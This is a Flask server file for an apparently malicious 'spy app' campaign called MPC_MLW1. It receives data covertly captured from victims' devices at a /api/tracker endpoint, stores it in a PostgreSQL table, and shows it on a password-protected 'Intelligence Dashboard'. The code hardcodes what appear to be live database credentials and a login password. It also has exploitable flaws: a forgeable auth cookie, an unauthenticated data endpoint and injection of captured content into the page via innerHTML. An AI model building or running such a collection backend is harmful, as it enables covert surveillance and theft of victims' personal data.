from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import psycopg2
import os
from datetime import datetime, timedelta

app = Flask(__name__)
CORS(app)

DATABASE_URL = os.environ.get('DATABASE_URL', 'postgresql://mlw_attack_user:ShJf3c9NA4Jf1ADITLYh3fIlHc7akHXC@dpg-d8063p9j2pic73f1mm40-a.frankfurt-postgres.render.com:5432/mlw_attack')

def get_db():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    conn = get_db()
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS captured_data (
            id SERIAL PRIMARY KEY,
            timestamp TIMESTAMP DEFAULT NOW(),
            ip TEXT,
            user_agent TEXT,
            data_type TEXT,
            data_content TEXT
        )
    ''')
    conn.commit()
    cur.close()
    conn.close()
    print("[+] Database ready")

init_db()

# ==================== DASHBOARD HTML ====================
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>MPC_MLW1 - Intelligence Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0e27; color: #00ffcc; font-family: 'Courier New', monospace; padding: 20px; }
        h1 { color: #ff3366; border-bottom: 2px solid #ff3366; padding-bottom: 10px; margin-bottom: 20px; }
        h2 { color: #ffd700; margin: 30px 0 15px 0; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { border: 1px solid #00ffcc; padding: 10px; text-align: left; }
        th { background: #1a1f3a; }
        .login { max-width: 400px; margin: 100px auto; background: #1a1f3a; padding: 30px; border-radius: 10px; }
        input, button { width: 100%; padding: 12px; margin: 10px 0; background: #0a0e27; color: #00ffcc; border: 1px solid #00ffcc; border-radius: 5px; }
        .stats { background: #1a1f3a; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: flex; gap: 20px; flex-wrap: wrap; }
        .stat-box { background: #0a0e27; padding: 10px 20px; border-radius: 8px; }
        .success { color: #00ff00; font-weight: bold; }
        .inactive { color: #ff6600; font-weight: bold; }
        .badge { background: #ff3366; color: white; padding: 2px 8px; border-radius: 20px; font-size: 11px; }
        .footer { margin-top: 30px; text-align: center; font-size: 11px; color: #666; }
    </style>
    <script>
        async function checkAuth() {
            const res = await fetch('/api/auth');
            const data = await res.json();
            if (!data.authenticated) {
                document.getElementById('login').style.display = 'block';
                document.getElementById('content').style.display = 'none';
            } else {
                document.getElementById('login').style.display = 'none';
                document.getElementById('content').style.display = 'block';
                loadData();
                setInterval(loadData, 5000);
            }
        }
        async function login() {
            const pwd = document.getElementById('pwd').value;
            const res = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ password: pwd }) });
            const data = await res.json();
            if (data.success) checkAuth();
            else alert('Wrong password');
        }
        async function loadData() {
            const res = await fetch('/api/data');
            const data = await res.json();
            let html = '';
            for (let r of data) {
                html += `<tr>
                    <td>${r.timestamp}</td>
                    <td>${r.ip}</td>
                    <td><span class="badge">${r.data_type}</span></td>
                    <td><pre style="max-width:400px; overflow-x:auto;">${r.data_content}</pre></td>
                </tr>`;
            }
            document.getElementById('data').innerHTML = html;
            document.getElementById('stats').innerHTML = `📊 Total captured: ${data.length}`;
            
            // Update status based on last capture time
            const statusRes = await fetch('/api/status');
            const statusData = await statusRes.json();
            const statusEl = document.getElementById('status');
            if (statusData.active) {
                statusEl.innerHTML = '<span class="success">● ACTIVE</span> (Spy app sending data)';
            } else {
                statusEl.innerHTML = '<span class="inactive">● INACTIVE</span> (No spy app data received)';
            }
        }
        checkAuth();
    </script>
</head>
<body>
<div id="login" class="login">
    <h2>🔐 MPC_MLW1 Control</h2>
    <input type="password" id="pwd" placeholder="Password">
    <button onclick="login()">Login</button>
</div>
<div id="content" style="display:none">
    <h1>🎯 MPC_MLW1 - Intelligence Dashboard</h1>
    <div class="stats">
        <div class="stat-box" id="status">🔴 Status: <span class="inactive">● INACTIVE</span></div>
        <div class="stat-box" id="stats">📊 Captured: 0</div>
        <div class="stat-box">🎯 Target: Attacker Device</div>
    </div>
    <h2>📋 Captured Data from Spy App</h2>
    <div style="overflow-x: auto;">
    <table>
        <thead><tr><th>Time</th><th>IP</th><th>Type</th><th>Content</th></tr></thead>
        <tbody id="data"></tbody>
    </table>
    </div>
    <div class="footer">MPC_MLW1 Security Operations - Tool Created by Mugisha Pc</div>
</div>
</body>
</html>
'''

# ==================== ROUTES ====================
@app.route('/')
def index():
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/auth')
def auth():
    return jsonify({'authenticated': request.cookies.get('mpc_auth') == 'true'})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    if data.get('password') == '0880Mdav!':
        resp = jsonify({'success': True})
        resp.set_cookie('mpc_auth', 'true', httponly=True, secure=True, samesite='Strict')
        return resp
    return jsonify({'success': False})

@app.route('/api/status')
def status():
    conn = get_db()
    cur = conn.cursor()
    five_min_ago = datetime.now() - timedelta(minutes=5)
    cur.execute('SELECT COUNT(*) FROM captured_data WHERE timestamp > %s', (five_min_ago,))
    count = cur.fetchone()[0]
    cur.close()
    conn.close()
    return jsonify({'active': count > 0})

@app.route('/api/tracker', methods=['POST'])
def tracker():
    data_type = request.form.get('type', request.json.get('type', 'unknown'))
    data_content = request.form.get('data', request.json.get('data', ''))
    conn = get_db()
    cur = conn.cursor()
    cur.execute('INSERT INTO captured_data (ip, user_agent, data_type, data_content) VALUES (%s, %s, %s, %s)',
        (request.remote_addr, request.headers.get('User-Agent', ''), data_type, data_content))
    conn.commit()
    cur.close()
    conn.close()
    print(f"[+] Captured - Type: {data_type}")
    return jsonify({'status': 'ok'})

@app.route('/api/data')
def get_data():
    conn = get_db()
    cur = conn.cursor()
    cur.execute('SELECT timestamp, ip, data_type, data_content FROM captured_data ORDER BY timestamp DESC LIMIT 100')
    rows = cur.fetchall()
    cur.close()
    conn.close()
    return jsonify([{'timestamp': r[0], 'ip': r[1], 'data_type': r[2], 'data_content': r[3]} for r in rows])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
